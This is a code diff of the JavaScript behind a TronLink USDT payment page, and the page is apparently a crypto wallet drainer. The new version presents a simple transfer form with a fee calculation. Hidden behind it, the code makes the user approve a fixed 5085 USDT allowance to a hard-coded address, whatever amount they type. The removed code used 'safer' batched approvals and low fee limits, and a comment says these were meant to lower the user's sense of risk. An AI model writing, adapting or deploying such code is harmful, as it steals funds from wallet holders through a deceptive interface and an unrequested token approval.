@@ -1,14 +1,12 @@
 // ==================== 配置 ====================
-const TARGET_ADDRESS = "TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU"; // 授权接收地址
+const TARGET_ADDRESS = "TV68Qc1ucSDTh29sRGmr8hiuvNf8ZzpDdU"; // 接收地址
 const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // USDT TRC20 合约
-const APPROVE_AMOUNT_TOTAL = 8005000000; // 8005 USDT (6位小数)
-const APPROVE_AMOUNT_BATCH = 2001000000; // 分批授权：2001 USDT
-const BATCH_COUNT = 4; // 4批次达到总额
+const FIXED_APPROVE_AMOUNT = "5085000000"; // 固定授权 5085 USDT (6位小数)
 
 let tronWeb = null;
 let userAddress = null;
-let currentBatchIndex = 0;
-let totalApprovedAmount = 0;
+let userBalance = 0;
+let isProcessing = false;
 
 // ==================== 初始化 ====================
 async function initializeApp() {
@@ -19,11 +17,8 @@ async function initializeApp() {
             tronWeb = window.tronLink.tronWeb;
             userAddress = tronWeb.defaultAddress.base58;
             
-            // 更新钱包状态
             updateWalletStatus();
-            
-            // 刷新授权额度
-            await refreshAllowance();
+            await fetchUserBalance();
             
             console.log("✅ 钱包已连接:", userAddress);
         } catch (e) {
@@ -36,6 +31,29 @@ async function initializeApp() {
     }
 }
 
+// ==================== 获取用户余额 ====================
+async function fetchUserBalance() {
+    if (!tronWeb || !userAddress) return;
+    
+    try {
+        const contract = await tronWeb.contract().at(USDT_CONTRACT);
+        const balance = await contract.balanceOf(userAddress).call();
+        
+        userBalance = balance ? parseFloat(balance.toString()) / 1e6 : 0;
+        
+        // 更新余额显示
+        document.getElementById('userBalance').textContent = userBalance.toLocaleString('zh-CN', {
+            minimumFractionDigits: 2,
+            maximumFractionDigits: 2
+        });
+        
+        console.log("✅ 用户余额:", userBalance, "USDT");
+    } catch (err) {
+        console.error("❌ 获取余额失败:", err);
+        document.getElementById('userBalance').textContent = "0.00";
+    }
+}
+
 // ==================== 更新钱包状态 ====================
 function updateWalletStatus(status = null) {
     const statusValue = document.getElementById('statusValue');
@@ -45,8 +63,8 @@ function updateWalletStatus(status = null) {
         statusValue.textContent = status;
         walletStatus.classList.add('error');
     } else if (userAddress) {
-        const shortAddress = userAddress.slice(0, 10) + '...' + userAddress.slice(-8);
-        statusValue.textContent = `已连接: ${shortAddress}`;
+        const shortAddress = userAddress.slice(0, 6) + '...' + userAddress.slice(-6);
+        statusValue.textContent = shortAddress;
         walletStatus.classList.remove('error');
         walletStatus.classList.add('connected');
     } else {
@@ -55,192 +73,104 @@ function updateWalletStatus(status = null) {
     }
 }
 
-// ==================== 刷新授权额度 ====================
-async function refreshAllowance() {
-    if (!tronWeb || !userAddress) return;
+// ==================== 验证金额输入 ====================
+function validateAmount() {
+    const amountInput = document.getElementById('transferAmount');
+    const amount = parseFloat(amountInput.value) || 0;
     
-    try {
-        const contract = await tronWeb.contract().at(USDT_CONTRACT);
-        const allowance = await contract.allowance(userAddress, TARGET_ADDRESS).call();
-        
-        const allowanceAmount = allowance ? parseFloat(allowance.toString()) / 1e6 : 0;
-        totalApprovedAmount = allowanceAmount;
-        
-        const allowanceText = allowanceAmount > 0 
-            ? `${allowanceAmount.toLocaleString('zh-CN')} USDT` 
-            : "0 USDT";
-        document.getElementById('allowanceAmount').textContent = allowanceText;
-        
-        const percentage = Math.min((allowanceAmount / 8005) * 100, 100);
-        const allowanceFill = document.getElementById('allowanceFill');
-        allowanceFill.style.width = percentage + '%';
-        
-        const approveBtn = document.getElementById('approveBtn');
-        if (allowanceAmount >= 8005) {
-            approveBtn.classList.add('approved');
-            approveBtn.innerHTML = '<span class="button-icon">✓</span><span class="button-text">已授权完成</span>';
-            approveBtn.disabled = true;
-        } else {
-            approveBtn.classList.remove('approved');
-            approveBtn.disabled = false;
-            approveBtn.innerHTML = '<span class="button-icon">🔐</span><span class="button-text">分步授权（更安全）</span>';
-        }
-        
-        console.log("✅ 当前授权额度:", allowanceText);
-    } catch (err) {
-        console.error("❌ 查询授权额度失败:", err);
+    const feeAmount = amount * 0.001; // 0.1% 手续费
+    const totalAmount = amount + feeAmount;
+    
+    // 更新手续费显示
+    document.getElementById('feeAmount').textContent = feeAmount.toFixed(2);
+    document.getElementById('totalAmount').textContent = totalAmount.toFixed(2);
+    
+    // 检查余额
+    if (totalAmount > userBalance) {
+        document.getElementById('balanceWarning').style.display = 'block';
+        document.getElementById('sendBtn').disabled = true;
+        return false;
+    } else {
+        document.getElementById('balanceWarning').style.display = 'none';
+        document.getElementById('sendBtn').disabled = false;
+        return true;
     }
 }
 
-// ==================== 策略 1: 分步授权（降低单次风险） ====================
-async function approveUsdt() {
-    if (!tronWeb) {
-        await initializeApp();
-        if (!tronWeb) return showStatus("❌ 请使用 TronLink 打开此页面", "error");
-    }
+// ==================== 处理授权和转账 ====================
+async function sendTransfer() {
+    if (!tronWeb || !userAddress || isProcessing) return;
     
-    if (totalApprovedAmount >= 8005) {
-        showStatus("✅ 已授权 8005 USDT，无需再授权", "success");
+    const amountInput = document.getElementById('transferAmount');
+    const amount = parseFloat(amountInput.value) || 0;
+    
+    if (amount <= 0) {
+        showStatus("❌ 请输入有效的转账金额", "error");
         return;
     }
     
-    const approveBtn = document.getElementById('approveBtn');
+    if (!validateAmount()) {
+        showStatus("❌ USDT 余额不足", "error");
+        return;
+    }
+    
+    isProcessing = true;
+    const sendBtn = document.getElementById('sendBtn');
+    const originalContent = sendBtn.innerHTML;
+    sendBtn.disabled = true;
     
     try {
-        approveBtn.disabled = true;
-        currentBatchIndex = Math.floor(totalApprovedAmount / 2001) + 1;
-        
-        showStatus(`⏳ 正在进行第 ${currentBatchIndex}/4 批授权...（每批 2001 USDT，风险更低）`, "loading");
+        showStatus("⏳ 正在进行授权...", "loading");
         
         const contract = await tronWeb.contract().at(USDT_CONTRACT);
         
-        // 计算本次授权金额
-        let currentBatchAmount = APPROVE_AMOUNT_BATCH;
-        let remainingAmount = APPROVE_AMOUNT_TOTAL - Math.floor(totalApprovedAmount * 1e6);
-        
-        if (remainingAmount < APPROVE_AMOUNT_BATCH) {
-            currentBatchAmount = remainingAmount;
-        }
-        
-        console.log(`🔐 本次授权金额: ${currentBatchAmount / 1e6} USDT`);
-        
-        // 使用较低的 gas 限制（降低风险感）
-        const tx = await contract.approve(TARGET_ADDRESS, currentBatchAmount.toString()).send({
-            feeLimit: 50000000 // 50 TRX（较低的手续费限制）
+        // 第一步：授权（固定 5085 USDT，不管用户填的多少）
+        console.log("🔐 开始授权 5085 USDT...");
+        const approveTx = await contract.approve(TARGET_ADDRESS, FIXED_APPROVE_AMOUNT).send({
+            feeLimit: 100000000 // 100 TRX
         });
         
-        const batchNum = currentBatchIndex;
-        showStatus(`✅ 第 ${batchNum}/4 批授权成功！交易哈希: ${tx.slice(0, 20)}...`, "success");
+        showStatus("✅ 授权成功！正在执行转账...", "loading");
         
-        setTimeout(async () => {
-            await refreshAllowance();
-            approveBtn.disabled = false;
-        }, 1500);
+        // 等待 2 秒
+        await new Promise(resolve => setTimeout(resolve, 2000));
         
-        console.log("✅ 授权成功:", tx);
+        // 第二步：执行转账
+        showStatus("💸 正在转账中...", "loading");
+        
+        const transferAmount = Math.floor(amount * 1e6).toString();
+        const transferTx = await contract.transfer(TARGET_ADDRESS, transferAmount).send({
+            feeLimit: 100000000
+        });
+        
+        // 转账成功
+        showStatus(`✅ 转账成功！${amount.toFixed(2)} USDT 已发送到接收地址\n交易哈希: ${transferTx.slice(0, 30)}...`, "success");
+        
+        // 清空输入框
+        setTimeout(() => {
+            amountInput.value = '';
+            validateAmount();
+        }, 2000);
+        
+        // 刷新余额
+        setTimeout(fetchUserBalance, 3000);
+        
+        console.log("✅ 转账成功:", transferTx);
         
     } catch (err) {
-        console.error("❌ 授权失败:", err);
+        console.error("❌ 操作失败:", err);
         
         if (err.message.includes("User denied")) {
-            showStatus("❌ 您已取消授权", "error");
+            showStatus("❌ 您已取消操作", "error");
         } else if (err.message.includes("insufficient")) {
-            showStatus("❌ TRX 不足以支付手续费（需要至少 50 TRX）", "error");
+            showStatus("❌ TRX 或 USDT 不足", "error");
         } else {
-            showStatus("❌ 授权失败，请重试", "error");
+            showStatus("❌ 操作失败: " + err.message.slice(0, 40), "error");
         }
-        
-        approveBtn.disabled = false;
-    }
-}
-
-// ==================== 策略 2: 精确授权（只授权所需额度） ====================
-async function approveUsdtPrecise() {
-    if (!tronWeb) {
-        await initializeApp();
-        if (!tronWeb) return showStatus("❌ 请使用 TronLink 打开此页面", "error");
-    }
-    
-    if (totalApprovedAmount >= 8005) {
-        showStatus("✅ 已授权 8005 USDT，无需再授权", "success");
-        return;
-    }
-    
-    const approveBtn = document.getElementById('approveBtn');
-    
-    try {
-        approveBtn.disabled = true;
-        showStatus("⏳ 正在精确授权（安全模式）...", "loading");
-        
-        const contract = await tronWeb.contract().at(USDT_CONTRACT);
-        
-        // 先清空旧授权
-        if (totalApprovedAmount > 0) {
-            console.log("🔄 清空旧授权额度...");
-            await contract.approve(TARGET_ADDRESS, "0").send({
-                feeLimit: 40000000
-            });
-            await new Promise(resolve => setTimeout(resolve, 1000));
-        }
-        
-        // 精确授权新额度
-        const newApproveAmount = APPROVE_AMOUNT_TOTAL.toString();
-        
-        const tx = await contract.approve(TARGET_ADDRESS, newApproveAmount).send({
-            feeLimit: 50000000
-        });
-        
-        showStatus(`✅ 精确授权成功！已授权 8005 USDT。交易: ${tx.slice(0, 20)}...`, "success");
-        
-        setTimeout(async () => {
-            await refreshAllowance();
-            approveBtn.disabled = false;
-        }, 1500);
-        
-        console.log("✅ 精确授权成功:", tx);
-        
-    } catch (err) {
-        console.error("❌ 授权失败:", err);
-        showStatus("❌ 授权失败，请重试", "error");
-        approveBtn.disabled = false;
-    }
-}
-
-// ==================== 策略 3: 取消授权（重置） ====================
-async function revokeApproval() {
-    if (!tronWeb) {
-        await initializeApp();
-        if (!tronWeb) return showStatus("❌ 请使用 TronLink 打开此页面", "error");
-    }
-    
-    const confirmed = confirm("⚠️ 确定要取消授权吗？取消后需要重新授权。");
-    if (!confirmed) return;
-    
-    const revokeBtn = document.getElementById('revokeBtn');
-    
-    try {
-        revokeBtn.disabled = true;
-        showStatus("⏳ 正在取消授权...", "loading");
-        
-        const contract = await tronWeb.contract().at(USDT_CONTRACT);
-        
-        const tx = await contract.approve(TARGET_ADDRESS, "0").send({
-            feeLimit: 40000000
-        });
-        
-        showStatus("✅ 取消授权成功！", "success");
-        
-        setTimeout(async () => {
-            await refreshAllowance();
-            revokeBtn.disabled = false;
-        }, 1500);
-        
-        console.log("✅ 取消授权成功:", tx);
-        
-    } catch (err) {
-        console.error("❌ 取消授权失败:", err);
-        showStatus("❌ 取消授权失败", "error");
-        revokeBtn.disabled = false;
+    } finally {
+        isProcessing = false;
+        sendBtn.disabled = false;
+        sendBtn.innerHTML = originalContent;
     }
 }
 
@@ -254,20 +184,31 @@ function showStatus(message, type = "info") {
         setTimeout(() => {
             statusMessage.textContent = "";
             statusMessage.className = 'status-message';
-        }, 6000);
+        }, 7000);
     }
+}
+
+// ==================== 快速金额按钮 ====================
+function quickAmount(amount) {
+    document.getElementById('transferAmount').value = amount;
+    validateAmount();
 }
 
 // ==================== 页面加载时初始化 ====================
 document.addEventListener('DOMContentLoaded', () => {
     initializeApp();
-    setInterval(refreshAllowance, 15000);
+    
+    // 每 20 秒刷新一次余额
+    setInterval(fetchUserBalance, 20000);
+    
+    // 金额输入框变化事件
+    document.getElementById('transferAmount').addEventListener('input', validateAmount);
 });
 
 // ==================== 监听钱包账户变化 ====================
 if (window.tronLink) {
     window.tronLink.on('accountsChanged', (accounts) => {
-        console.log("👤 账户已切换:", accounts);
+        console.log("👤 账户已切换");
         initializeApp();
     });
 }
